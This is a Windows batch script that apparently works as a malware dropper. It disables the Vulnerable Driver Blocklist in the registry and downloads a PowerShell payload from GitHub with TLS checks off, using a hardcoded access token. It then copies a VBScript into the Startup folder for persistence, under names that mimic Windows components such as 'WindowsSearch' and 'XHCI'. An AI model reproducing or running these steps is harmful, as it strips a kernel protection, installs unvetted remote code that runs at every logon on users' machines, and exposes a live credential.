@echo off
setlocal
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Config" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f

curl -g -k -L -H "Authorization: token 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" -o "C:\XHCI.ps1" "https://raw.githubusercontent.com/mosol1/WindowsSearch/main/XHCI.ps1"
rem Set the paths
set "vbsFile=%appdata%\WindowsSearch\XHCI.vbs"
set "startupFolder=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Copy the VBScript file to the Startup folder
xcopy /Y "%vbsFile%" "%startupFolder%"

echo VBScript file copied to Startup folder.

exit /b
